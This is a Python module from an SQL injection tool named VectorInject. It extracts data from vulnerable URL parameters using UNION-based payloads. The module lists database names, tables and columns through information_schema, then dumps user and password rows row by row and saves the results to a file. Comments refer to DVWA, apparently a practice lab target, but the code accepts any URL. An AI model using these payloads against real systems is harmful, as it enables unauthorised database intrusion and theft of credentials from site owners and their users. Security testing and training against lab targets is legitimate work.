"""
VectorInject - Extractor Module
Extracts databases, tables, columns, and data from SQL injection
"""

import sys
import os
import re
import time

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

import urllib.parse
from utils import colors, logger
from utils.http_client import HTTPClient
from config import settings


class Extractor:
    """Extracts data from vulnerable SQL injection points"""
    
    def __init__(self, url, parameter, database=None, client=None):
        self.url = url
        self.parameter = parameter
        self.database = database or "MySQL"
        self.client = client or HTTPClient()
        self.logger = logger.get_logger("Extractor")
        self.extracted_data = {}
    
    def _build_url(self, payload):
        """Build URL with payload"""
        parsed = urllib.parse.urlparse(self.url)
        query_params = urllib.parse.parse_qs(parsed.query)
        original_value = query_params.get(self.parameter, [''])[0]
        query_params[self.parameter] = [original_value + payload]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        new_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        return new_url
    
    def _extract_value(self, content, pattern):
        """Extract value from response using regex"""
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            return match.group(1).strip()
        return None
    
    def _send_extraction_payload(self, payload, pattern):
        """Send payload and extract value from response"""
        test_url = self._build_url(payload)
        result = self.client.get(test_url)
        
        if result['error']:
            return None
        
        return self._extract_value(result['content'], pattern)
    
    # ============================================================
    # Extract Databases
    # ============================================================
    
    def extract_databases(self):
        """Extract all database names (UNION-based)"""
        colors.section("Extracting Databases")
        
        # UNION-based payload (2 columns for DVWA)
        payload = "' UNION SELECT 1, group_concat(schema_name) FROM information_schema.schemata-- -"
        
        test_url = self._build_url(payload)
        result = self.client.get(test_url)
        
        if result['error'] or result['status'] != 200:
            colors.warning("UNION-based extraction failed")
            return []
        
        # Extract from Surname field (usually column 2)
        content = result['content']
        
        # Try to find the databases in the response
        databases = self._extract_union_result(content)
        
        if databases:
            colors.success(f"Found {len(databases)} database(s)")
            for db in databases:
                print(f"    - {db}")
            self.extracted_data['databases'] = databases
            return databases
        
        colors.warning("Could not extract databases")
        return []
    
    def _extract_union_result(self, content):
        """Extract data from DVWA-style response"""
        import re
        
        # Look for the pattern: Surname: <data>
        patterns = [
            r'Surname:\s*([^<\n]+)',
            r'First name:\s*([^<\n]+)',
        ]
        
        results = []
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                cleaned = match.strip()
                # Skip if it's just normal data (not our payload result)
                if cleaned and cleaned not in ['admin', '1', '2']:
                    # Split by comma if it's a list
                    if ',' in cleaned:
                        items = [x.strip() for x in cleaned.split(',')]
                        results.extend(items)
                    else:
                        results.append(cleaned)
        
        # Remove duplicates and empty
        unique = []
        for r in results:
            if r and r not in unique and len(r) > 1:
                unique.append(r)
        
        return unique    
    # ============================================================
    # Extract Tables
    # ============================================================
    
    def extract_tables(self, database_name):
        """Extract tables from a specific database (UNION-based)"""
        colors.section(f"Extracting Tables from: {database_name}")
        
        payload = f"' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema='{database_name}'-- -"
        
        test_url = self._build_url(payload)
        result = self.client.get(test_url)
        
        if result['error'] or result['status'] != 200:
            colors.warning("UNION-based extraction failed")
            return []
        
        tables = self._extract_union_result(result['content'])
        
        if tables:
            colors.success(f"Found {len(tables)} table(s)")
            for t in tables:
                print(f"    - {t}")
            self.extracted_data['tables'] = tables
            return tables
        
        colors.warning("Could not extract tables")
        return []    
    # ============================================================
    # Extract Columns
    # ============================================================
    
    def extract_columns(self, database_name, table_name):
        """Extract columns from a table (UNION-based)"""
        colors.section(f"Extracting Columns from: {database_name}.{table_name}")
        
        payload = f"' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='{table_name}'-- -"
        
        test_url = self._build_url(payload)
        result = self.client.get(test_url)
        
        if result['error'] or result['status'] != 200:
            colors.warning("UNION-based extraction failed")
            return []
        
        columns = self._extract_union_result(result['content'])
        
        if columns:
            colors.success(f"Found {len(columns)} column(s)")
            for c in columns:
                print(f"    - {c}")
            self.extracted_data['columns'] = columns
            return columns
        
        colors.warning("Could not extract columns")
        return []    
    # ============================================================
    # Dump Table Data
    # ============================================================
    
    def dump_table(self, database_name, table_name, columns=None):
        """Dump data from table using UNION-based extraction (row by row)"""
        colors.section(f"Dumping Data from: {database_name}.{table_name}")
        
        import urllib.parse
        import re
        
        base_url = self.url.split('?')[0] + "?id={}&Submit=Submit"
        
        results = []
        max_rows = 50
        
        for i in range(max_rows):
            payload = f"1' UNION SELECT user, password FROM {database_name}.{table_name} LIMIT 1 OFFSET {i}-- -"
            encoded = urllib.parse.quote(payload, safe='')
            url = base_url.format(encoded)
            
            r = self.client.get(url)
            
            if r['status'] != 200:
                break
            
            matches = re.findall(
                r'First name:\s*([^<\n]+).*?Surname:\s*([^<\n]+)',
                r['content'],
                re.DOTALL
            )
            
            found_new = False
            for first, surname in matches:
                first = first.strip()
                surname = surname.strip()
                # Skip default DVWA values
                if first in ['admin', '1', '2'] and surname == 'admin':
                    continue
                if first == '1' and surname == '1':
                    continue
                if not first or not surname:
                    continue
                
                entry = {'user': first, 'password': surname}
                if entry not in results:
                    results.append(entry)
                    print(f"    [+] {first:20} : {surname}")
                    found_new = True
                break
            
            if not found_new and i > 5:
                break
        
        if results:
            colors.success(f"Dumped {len(results)} row(s)")
            self.extracted_data['data'] = results
        else:
            colors.warning("No data dumped")
        
        return results
    # ============================================================
    # Save Results
    # ============================================================
    
    def save_results(self, filename=None):
        """Save extracted data to file"""
        if not filename:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"extracted_{timestamp}.txt"
        
        filepath = os.path.join(settings.OUTPUT_DIR, filename)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("VectorInject - Extraction Results\n")
                f.write("=" * 60 + "\n\n")
                f.write(f"Target: {self.url}\n")
                f.write(f"Parameter: {self.parameter}\n")
                f.write(f"Database: {self.database}\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for key, value in self.extracted_data.items():
                    f.write(f"\n[{key.upper()}]\n")
                    f.write("-" * 60 + "\n")
                    if isinstance(value, list):
                        for item in value:
                            f.write(f"  {item}\n")
                    elif isinstance(value, dict):
                        for col, vals in value.items():
                            f.write(f"\n  Column: {col}\n")
                            for v in vals:
                                f.write(f"    {v}\n")
                    f.write("\n")
            
            colors.success(f"Results saved to: {filepath}")
            return filepath
        
        except Exception as e:
            colors.error(f"Failed to save results: {str(e)}")
            return None


def extract_all(url, parameter, database="MySQL"):
    """Convenience function"""
    ext = Extractor(url, parameter, database)
    dbs = ext.extract_databases()
    return ext


if __name__ == "__main__":
    if len(sys.argv) > 2:
        extract_all(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 extractor.py <URL> <PARAMETER> [DATABASE]")
